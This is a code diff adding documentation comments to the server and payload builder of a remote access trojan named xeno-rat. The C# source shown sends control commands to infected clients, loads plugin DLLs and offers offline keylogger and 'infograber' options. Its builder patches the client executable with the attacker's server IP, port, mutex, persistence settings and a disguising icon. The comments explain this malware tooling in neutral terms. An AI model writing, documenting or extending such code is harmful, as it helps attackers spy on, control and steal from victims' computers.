+        /// <exception cref="Exception">Thrown when an error occurs during the removal process.</exception>
+        /// <returns>A task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method starts by creating a sub-node using the provided <paramref name="client"/> and then attempts to load the "Startup" DLL using the Utils.LoadDllAsync method.
+        /// If the loading is successful, it sends a byte array to the sub-client and displays a message indicating successful removal of the startup.
+        /// If the loading fails, it displays an error message and returns from the method.
+        /// In case of any exceptions during the process, an error message is displayed.
+        /// </remarks>
         private async Task StartRemoveStartup(Node client)
         {
             try
@@ -1246,24 +1717,66 @@ namespace xeno_rat_server
             }
             
         }
+
+        /// <summary>
+        /// Sends a byte array to the specified Node client, waits for 1 second, and then disconnects the client.
+        /// </summary>
+        /// <param name="client">The Node client to which the byte array will be sent.</param>
+        /// <remarks>
+        /// This method asynchronously sends a byte array containing the value 2 to the specified <paramref name="client"/> using the SendAsync method.
+        /// After sending the byte array, it waits for 1 second using Task.Delay.
+        /// Finally, it disconnects the <paramref name="client"/> using the Disconnect method.
+        /// </remarks>
         private async Task StartClose(Node client) 
         {
             await client.SendAsync(new byte[] { 2 });
             await Task.Delay(1000);
             client.Disconnect();
         }
+
+        /// <summary>
+        /// Sends a byte array to the specified <paramref name="client"/> and then disconnects after a delay of 1000 milliseconds.
+        /// </summary>
+        /// <param name="client">The Node to which the byte array will be sent.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method sends a byte array with a value of 3 to the specified <paramref name="client"/> using the SendAsync method.
+        /// After sending the byte array, it waits for 1000 milliseconds using Task.Delay before disconnecting the client using the Disconnect method.
+        /// </remarks>
         private async Task StartRelaunch(Node client)
         {
             await client.SendAsync(new byte[] { 3 });
             await Task.Delay(1000);
             client.Disconnect();
         }
+
+        /// <summary>
+        /// Initiates the uninstall process for the specified node.
+        /// </summary>
+        /// <param name="client">The node to be uninstalled.</param>
+        /// <remarks>
+        /// This method sends a byte array with the value 4 to the specified <paramref name="client"/> to initiate the uninstall process.
+        /// After sending the byte array, it waits for 1000 milliseconds before disconnecting from the <paramref name="client"/>.
+        /// </remarks>
         private async Task StartUninstall(Node client)
         {
             await client.SendAsync(new byte[] { 4 });
             await Task.Delay(1000);
             client.Disconnect();
         }
+
+        /// <summary>
+        /// Initiates the shutdown process for the specified <paramref name="client"/> node by performing the following steps:
+        /// 1. Creates a sub-node using the <paramref name="client"/> node with the specified ID.
+        /// 2. Loads the "SystemPower" DLL into the sub-node asynchronously using the Utils class, and logs the process using the <paramref name="AddLog"/> method.
+        /// 3. Displays an error message if loading the "SystemPower" DLL fails and returns from the method.
+        /// 4. Sends a byte array with value 1 to the sub-node asynchronously.
+        /// 5. Delays the execution for 1000 milliseconds.
+        /// 6. Disconnects the sub-node.
+        /// </summary>
+        /// <param name="client">The node for which the shutdown process is initiated.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
+        /// <exception cref="Exception">Thrown when an error occurs during the shutdown process, specifically related to the "SystemPower" DLL.</exception>
         private async Task StartShutdown(Node client) 
         {
             try
@@ -1284,6 +1797,19 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with SystemPower dll!");
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts or restarts the specified client node.
+        /// </summary>
+        /// <param name="client">The client node to start or restart.</param>
+        /// <exception cref="Exception">Thrown when an error occurs while starting or restarting the client node.</exception>
+        /// <returns>A task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method creates a sub-node using the provided <paramref name="client"/> and loads the "SystemPower" DLL using the <see cref="Utils.LoadDllAsync"/> method.
+        /// If the DLL loading is unsuccessful, an error message is displayed, and the method returns.
+        /// Otherwise, a byte array is sent to the sub-node, followed by a delay of 1000 milliseconds before disconnecting the sub-node.
+        /// If an error occurs during the process, an error message related to the "SystemPower" DLL is displayed.
+        /// </remarks>
         private async Task StartRestart(Node client) 
         {
             try
@@ -1305,6 +1831,18 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Starts the debug information for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node for which the debug information is to be started.</param>
+        /// <exception cref="Exception">Thrown when an error occurs while creating the subclient node or connecting the socket.</exception>
+        /// <returns>Task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method asynchronously creates a subclient node using the specified client node and starts the debug information for it.
+        /// If the subclient node creation fails, an error message is displayed using a message box, and the method returns without further processing.
+        /// If the debug information form is successfully started, it runs the application with the debug information form and then disconnects the subclient node.
+        /// If any error occurs during the process, an error message is displayed using a message box.
+        /// </remarks>
         private async Task StartDebugInfo(Node client) 
         {
             try
@@ -1324,22 +1862,58 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Starts a plugin by executing the provided function asynchronously.
+        /// </summary>
+        /// <param name="func">The function to be executed.</param>
+        /// <param name="client">The client node to be passed to the function.</param>
+        /// <remarks>
+        /// This method starts a plugin by executing the provided function asynchronously using Task.Run.
+        /// </remarks>
         private void StartPlugin(Func<Node, Task> func, Node client) 
         {
             Task.Run(() => func(client));
         }
+
+        /// <summary>
+        /// Starts a new thread with a single-threaded apartment (STA) and executes the provided asynchronous function with the specified client node.
+        /// </summary>
+        /// <param name="func">The asynchronous function to be executed.</param>
+        /// <param name="client">The client node to be passed to the asynchronous function.</param>
+        /// <remarks>
+        /// This method starts a new thread and sets its apartment state to STA (single-threaded apartment) to enable COM interoperability for the provided asynchronous function.
+        /// The provided asynchronous function is executed with the specified client node in the new thread.
+        /// </remarks>
         private void StartPluginSTA(Func<Node, Task> func, Node client)
         {
             Thread t = new Thread(async () => await func(client));
             t.SetApartmentState(ApartmentState.STA);
             t.Start();
         }
+
+        /// <summary>
+        /// Handles the click event of the menu item and performs the corresponding action based on the selected client and command.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method retrieves the client associated with the clicked menu item and the command text. It then calls the MenuClick method to perform the corresponding action based on the selected client and command.
+        /// </remarks>
         public void OnMenuClick(object sender, ToolStripItemClickedEventArgs e)
         {
             Node client = (Node)((ToolStripMenuItem)sender).Tag;
             string command = e.ClickedItem.Text;
             MenuClick(client, command);
         }
+
+        /// <summary>
+        /// Handles the menu click event and starts the corresponding plugin based on the provided command.
+        /// </summary>
+        /// <param name="client">The client node.</param>
+        /// <param name="command">The command indicating which plugin to start.</param>
+        /// <remarks>
+        /// This method determines the appropriate plugin to start based on the provided <paramref name="command"/> and initiates it using the <see cref="StartPlugin"/> method.
+        /// </remarks>
         public void MenuClick(Node client, string command) 
         {
             if (command == "Chat")
@@ -1461,6 +2035,16 @@ namespace xeno_rat_server
             Console.WriteLine(command);
 
         }
+
+        /// <summary>
+        /// Launches a context menu for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node for which the context menu is launched.</param>
+        /// <remarks>
+        /// This method creates a context menu and populates it with items based on the commands associated with the client node.
+        /// Each command is added as a menu item, and if there are sub-commands, they are added as dropdown items.
+        /// The context menu is then displayed at the current cursor position.
+        /// </remarks>
         private void LaunchContext(Node client)
         {
             ContextMenuStrip contextMenu = new ContextMenuStrip();
@@ -1477,6 +2061,16 @@ namespace xeno_rat_server
             }
             contextMenu.Show(Cursor.Position);
         }
+
+        /// <summary>
+        /// Handles the mouse click event for listView2 and launches the context menu for the focused item if the right mouse button is clicked.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">A MouseEventArgs that contains the event data.</param>
+        /// <remarks>
+        /// This method checks if the right mouse button is clicked and if the focused item is not null and the click location is within the bounds of the focused item.
+        /// If these conditions are met, it launches the context menu for the focused item.
+        /// </remarks>
         private void listView2_MouseClick(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Right)
@@ -1488,6 +2082,16 @@ namespace xeno_rat_server
                 }
             }
         }
+
+        /// <summary>
+        /// Sets the encryption key for the specified method in the given module.
+        /// </summary>
+        /// <param name="module">The module in which the method is defined.</param>
+        /// <param name="EncryptionKey">The encryption key to be set.</param>
+        /// <exception cref="NullReferenceException">Thrown when the specified method or its body is null.</exception>
+        /// <remarks>
+        /// This method sets the encryption key for the specified method in the given module. It first locates the type and method within the module using the provided type and method names. If the method and its body are found, it then retrieves the instruction at the specified index within the method's body and sets its operand's initial value to the provided encryption key after resizing it to 32 bytes.
+        /// </remarks>
         public static void SetEncryptionKey(ModuleDefMD module, byte[] EncryptionKey)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1502,6 +2106,16 @@ namespace xeno_rat_server
                 ((FieldDef)instruction.Operand).InitialValue = EncryptionKey;
             }
         }
+
+        /// <summary>
+        /// Sets the server IP address in the specified module.
+        /// </summary>
+        /// <param name="module">The module in which the server IP address needs to be set.</param>
+        /// <param name="ip">The IP address of the server.</param>
+        /// <remarks>
+        /// This method locates the specified type and method within the provided module and updates the instruction at the specified index with the new server IP address.
+        /// If the type or method is not found, or if the method's body is null, the IP address will not be updated.
+        /// </remarks>
         public static void SetServerIp(ModuleDefMD module, string ip)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1515,6 +2129,16 @@ namespace xeno_rat_server
                 instruction.Operand = ip;
             }
         }
+
+        /// <summary>
+        /// Sets the server port for the specified module.
+        /// </summary>
+        /// <param name="module">The module to set the server port for.</param>
+        /// <param name="port">The port number to set.</param>
+        /// <remarks>
+        /// This method sets the server port for the specified module by modifying the instruction at the specified index within the method ".cctor" of the type "xeno_rat_client.Program" in the module.
+        /// If the type or method is not found, or if the method body is null, the server port will not be set.
+        /// </remarks>
         public static void SetServerPort(ModuleDefMD module, int port)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1528,6 +2152,17 @@ namespace xeno_rat_server
                 instruction.Operand = port;
             }
         }
+
+        /// <summary>
+        /// Sets the delay for a specific instruction in the specified method of the given module.
+        /// </summary>
+        /// <param name="module">The module in which the method is defined.</param>
+        /// <param name="delay">The delay to be set for the instruction.</param>
+        /// <exception cref="NullReferenceException">Thrown when the specified type or method is not found in the module.</exception>
+        /// <remarks>
+        /// This method sets the delay for a specific instruction in the method ".cctor" of the type "xeno_rat_client.Program" within the given module.
+        /// If the specified type or method is not found in the module, a NullReferenceException is thrown.
+        /// </remarks>
         public static void SetDelay(ModuleDefMD module, int delay)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1541,6 +2176,16 @@ namespace xeno_rat_server
                 instruction.Operand = delay;
             }
         }
+
+        /// <summary>
+        /// Sets the mutex value in the specified method of the given module.
+        /// </summary>
+        /// <param name="module">The module in which the method is located.</param>
+        /// <param name="mutex">The mutex value to be set.</param>
+        /// <remarks>
+        /// This method finds the specified type and method within the module and sets the operand of the instruction at the specified index to the provided mutex value.
+        /// If the type or method is not found, or if the method's body is null, the mutex value will not be set.
+        /// </remarks>
         public static void SetMutex(ModuleDefMD module, string mutex)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1554,6 +2199,12 @@ namespace xeno_rat_server
                 instruction.Operand = mutex;
             }
         }
+
+        /// <summary>
+        /// Sets the startup for the specified module.
+        /// </summary>
+        /// <param name="module">The module to set the startup for.</param>
+        /// <param name="dostartup">A boolean value indicating whether to set the startup.</param>
         public static void SetStartup(ModuleDefMD module, bool dostartup)
         {
             if (!dostartup) return;
@@ -1568,6 +2219,16 @@ namespace xeno_rat_server
                 instruction.Operand = 1;
             }
         }
+
+        /// <summary>
+        /// Sets the installation environment for the specified module.
+        /// </summary>
+        /// <param name="module">The module definition to set the installation environment for.</param>
+        /// <param name="env">The installation environment to be set.</param>
+        /// <remarks>
+        /// This method finds the specified type and method within the module and sets the operand of the instruction at the specified index to the provided installation environment.
+        /// If the type or method is not found, or if the method body is null, the installation environment will not be set.
+        /// </remarks>
         public static void SetInstallenv(ModuleDefMD module, string env)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1581,6 +2242,15 @@ namespace xeno_rat_server
                 instruction.Operand = env;
             }
         }
+
+        /// <summary>
+        /// Sets the startup name in the specified module.
+        /// </summary>
+        /// <param name="module">The module in which the startup name is to be set.</param>
+        /// <param name="name">The name to be set as the startup name.</param>
+        /// <remarks>
+        /// This method finds the specified type and method within the module and sets the operand of the instruction at the specified index to the provided name.
+        /// </remarks>
         public static void SetStartupName(ModuleDefMD module, string name)
         {
             string typeName = "xeno_rat_client.Program";
@@ -1594,6 +2264,19 @@ namespace xeno_rat_server
                 instruction.Operand = name;
             }
         }
+
+        /// <summary>
+        /// Handles the click event of button2. Builds the client with the specified configurations and saves it to a selected location.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">An EventArgs that contains the event data.</param>
+        /// <remarks>
+        /// This method handles the click event of button2. It first checks if the label16 text contains ":" and the file specified by label16 text does not exist, then displays a message box indicating that the icon could not be found and prompts the user to pick another.
+        /// It then opens a SaveFileDialog to select the location to save the file. If the user cancels the dialog, the method returns.
+        /// The method then proceeds to build the client with the specified configurations, including encryption key, server IP, server port, mutex, delay, startup settings, installation environment, startup name, and version information.
+        /// After building the client, it sets the version resource, saves the file, injects an icon if specified, and displays a message box indicating that the file has been saved.
+        /// If any exception occurs during the process, it logs the error, displays an error message box with the exception message, and indicates that the client build failed.
+        /// </remarks>
         private void button2_Click(object sender, EventArgs e)
         {
             try
@@ -1667,6 +2350,18 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Opens a file dialog to select an ICO file and sets the selected file path to a label.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <exception cref="System.InvalidOperationException">Thrown when the file dialog encounters an invalid operation.</exception>
+        /// <returns>Nothing.</returns>
+        /// <remarks>
+        /// This method opens a file dialog to allow the user to select an ICO file.
+        /// If a file is selected, the file path is set to the label with the name "label16".
+        /// If no file is selected, the method returns without performing any action.
+        /// </remarks>
         private void button3_Click(object sender, EventArgs e)
         {
             OpenFileDialog openFileDialog = new OpenFileDialog();
@@ -1680,11 +2375,24 @@ namespace xeno_rat_server
             label16.Text= openFileDialog.FileName;
         }
 
+        /// <summary>
+        /// Sets the text of label16 to "No Icon Selected" when button4 is clicked.
+        /// </summary>
         private void button4_Click(object sender, EventArgs e)
         {
             label16.Text = "No Icon Selected";
         }
 
+        /// <summary>
+        /// Updates the label text with the current password and calculates the SHA256 hash of the input password.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event arguments.</param>
+        /// <remarks>
+        /// This method updates the label text to display the current password entered in the textbox.
+        /// It then calculates the SHA256 hash of the input password using the CalculateSha256Bytes method from the Utils class.
+        /// The calculated hash is stored in the key variable for further use.
+        /// </remarks>
         private void button5_Click(object sender, EventArgs e)
         {
             label17.Text = "Current Password: "+ textBox5.Text;
@@ -1692,31 +2400,76 @@ namespace xeno_rat_server
             key = Utils.CalculateSha256Bytes(textBox5.Text);
         }
 
+        /// <summary>
+        /// Event handler for the ClientSizeChanged event of listView2.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">An EventArgs that contains the event data.</param>
+        /// <remarks>
+        /// This event is raised when the ClientSize property of listView2 has changed.
+        /// </remarks>
         private void listView2_ClientSizeChanged(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Event handler for the Click event of tabPage5.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method is an event handler for the Click event of tabPage5. It is triggered when tabPage5 is clicked.
+        /// </remarks>
         private void tabPage5_Click(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Event handler for the TextChanged event of textBox8.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method is called when the text in textBox8 is changed. It does not perform any specific action and can be used to handle the event as per the application's requirements.
+        /// </remarks>
         private void textBox8_TextChanged(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Represents the event handler for the Click event of the label10 control.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">An <see cref="EventArgs"/> that contains the event data.</param>
         private void label10_Click(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Enables or disables the <see cref="textBox16"/> based on the checked state of <see cref="checkBox1"/>.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method enables the <see cref="textBox16"/> if <see cref="checkBox1"/> is checked; otherwise, it disables the <see cref="textBox16"/>.
+        /// </remarks>
         private void checkBox1_CheckedChanged(object sender, EventArgs e)
         {
             textBox16.Enabled = checkBox1.Checked;
         }
 
+        /// <summary>
+        /// Handles the event when the state of checkBox2 is changed.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method unchecks checkBox3 if it is checked, and reattaches the event handler for checkBox3.CheckedChanged to checkBox3.
+        /// </remarks>
         private void checkBox2_CheckedChanged(object sender, EventArgs e)
         {
             if (checkBox3.Checked) 
@@ -1727,6 +2480,14 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Handles the CheckedChanged event for checkBox3.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method unchecks checkBox2 if it is checked, and reattaches the event handler for checkBox2.CheckedChanged to checkBox2_CheckedChanged.
+        /// </remarks>
         private void checkBox3_CheckedChanged(object sender, EventArgs e)
         {
             if (checkBox2.Checked)
@@ -1737,6 +2498,15 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Handles the MouseUp event for listView4, displaying a context menu with options to start offline keylogger, infograber, and remove items.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">A MouseEventArgs that contains the event data.</param>
+        /// <remarks>
+        /// This method creates a context menu with options to start offline keylogger and infograber. It also allows removing items from the listView4.
+        /// When an option is clicked, it adds or removes the corresponding item from the listView4.
+        /// </remarks>
         private void listView4_MouseUp(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Right)
@@ -1782,16 +2552,35 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Event handler for the TextChanged event of the richTextBox1 control.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">An EventArgs that contains the event data.</param>
         private void richTextBox1_TextChanged(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Event handler for the SelectedIndexChanged event of listView3.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">The EventArgs that contains the event data.</param>
         private void listView3_SelectedIndexChanged(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Handles the mouse click event on listView3 and copies the selected item's value to the clipboard.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">A MouseEventArgs that contains the event data.</param>
+        /// <remarks>
+        /// This method checks if the right mouse button is clicked and if there is at least one item selected in listView3.
+        /// If the conditions are met, it constructs a string from the selected item's subitems and copies it to the clipboard when the "Copy" menu item is clicked.
+        /// </remarks>
         private void listView3_MouseClick(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Right && listView3.SelectedItems.Count > 0)
@@ -1807,6 +2596,15 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Sets the <see cref="LogErrors"/> property based on the checked state of the checkbox.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method sets the value of the <see cref="LogErrors"/> property based on the checked state of the checkbox.
+        /// If the checkbox is checked, <see cref="LogErrors"/> is set to true; otherwise, it is set to false.
+        /// </remarks>
         private void checkBox4_CheckedChanged(object sender, EventArgs e)
         {
             LogErrors = checkBox4.Checked;
@@ -1818,15 +2616,38 @@ namespace xeno_rat_server
         [SuppressUnmanagedCodeSecurity()]
         private class NativeMethods
         {
+
+            /// <summary>
+            /// Begins an update of the resource of the specified file.
+            /// </summary>
+            /// <param name="fileName">The name of the file whose resource will be updated.</param>
+            /// <param name="deleteExistingResources">A boolean value indicating whether to delete existing resources.</param>
+            /// <returns>An IntPtr that represents the beginning of the update resource process.</returns>
             [DllImport("kernel32")]
             public static extern IntPtr BeginUpdateResource(string fileName,
                 [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);
 
+            /// <summary>
+            /// Updates a resource in a portable executable (PE) file or a resource file.
+            /// </summary>
+            /// <param name="hUpdate">A handle to the update context returned by the BeginUpdateResource function.</param>
+            /// <param name="type">The type of the resource to be updated.</param>
+            /// <param name="name">The name of the resource to be updated.</param>
+            /// <param name="language">The language of the resource to be updated.</param>
+            /// <param name="data">The data to be updated.</param>
+            /// <param name="dataSize">The size of the data to be updated.</param>
+            /// <returns>True if the resource is successfully updated; otherwise, false.</returns>
             [DllImport("kernel32")]
             [return: MarshalAs(UnmanagedType.Bool)]
             public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language,
                 [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);
 
+            /// <summary>
+            /// Ends the update of a resource file that was previously opened for editing.
+            /// </summary>
+            /// <param name="hUpdate">A handle to the update resource. This handle is returned by the BeginUpdateResource function.</param>
+            /// <param name="discard">Indicates whether to write the resource updates to the file. If this parameter is TRUE, the resource updates are discarded. If it is FALSE, the updates are written to the file.</param>
+            /// <returns>True if the resource update is successfully ended; otherwise, false.</returns>
             [DllImport("kernel32")]
             [return: MarshalAs(UnmanagedType.Bool)]
             public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
@@ -1893,6 +2714,15 @@ namespace xeno_rat_server
             public ushort ID;
         }
 
+        /// <summary>
+        /// Injects an icon into the specified executable file.
+        /// </summary>
+        /// <param name="exeFileName">The path of the executable file to which the icon will be injected.</param>
+        /// <param name="iconFileName">The path of the icon file to be injected.</param>
+        /// <param name="iconGroupID">The ID of the icon group within the executable file.</param>
+        /// <param name="iconBaseID">The base ID of the icon within the group.</param>
+        /// <exception cref="IconFileException">Thrown when there is an issue with the icon file.</exception>
+        /// <exception cref="ResourceUpdateException">Thrown when there is an issue with updating the resource in the executable file.</exception>
         public static void InjectIcon(string exeFileName, string iconFileName)
         {
             InjectIcon(exeFileName, iconFileName, 1, 1);
@@ -1928,11 +2758,29 @@ namespace xeno_rat_server
                 get { return iconDir.Count; }
             }
 
+            /// <summary>
+            /// Retrieves the image data at the specified index.
+            /// </summary>
+            /// <param name="index">The index of the image data to be retrieved.</param>
+            /// <returns>The image data at the specified <paramref name="index"/>.</returns>
             public byte[] ImageData(int index)
             {
                 return iconImage[index];
             }
 
+            /// <summary>
+            /// Creates an IconFile instance from the specified file.
+            /// </summary>
+            /// <param name="filename">The path of the file from which to create the IconFile instance.</param>
+            /// <returns>An instance of IconFile created from the specified file.</returns>
+            /// <exception cref="System.IO.FileNotFoundException">Thrown when the specified file is not found.</exception>
+            /// <exception cref="System.IO.IOException">Thrown when an I/O error occurs while reading the file.</exception>
+            /// <remarks>
+            /// This method reads the contents of the specified file into memory and populates the IconFile instance with the icon directory and image data.
+            /// It uses marshaling to convert the byte array into structured data and allocates memory using GCHandle.
+            /// The method then iterates through the icon directory entries, copying the image data into the iconImage array.
+            /// Finally, it frees the allocated memory and returns the populated IconFile instance.
+            /// </remarks>
             public static IconFile FromFile(string filename)
             {
                 IconFile instance = new IconFile();
@@ -1967,6 +2815,16 @@ namespace xeno_rat_server
                 return instance;
             }
 
+            /// <summary>
+            /// Creates icon group data for the specified icon base ID.
+            /// </summary>
+            /// <param name="iconBaseID">The base ID for the icons.</param>
+            /// <returns>The icon group data as a byte array.</returns>
+            /// <remarks>
+            /// This method creates icon group data for the specified icon base ID by marshalling the ICONDIR and GRPICONDIRENTRY structures and copying the image data into a byte array.
+            /// The method allocates memory for the data, pins it, and then marshals the structures and image data into the pinned memory.
+            /// Finally, the method frees the pinned memory and returns the icon group data as a byte array.
+            /// </remarks>
             public byte[] CreateIconGroupData(uint iconBaseID)
             {
 
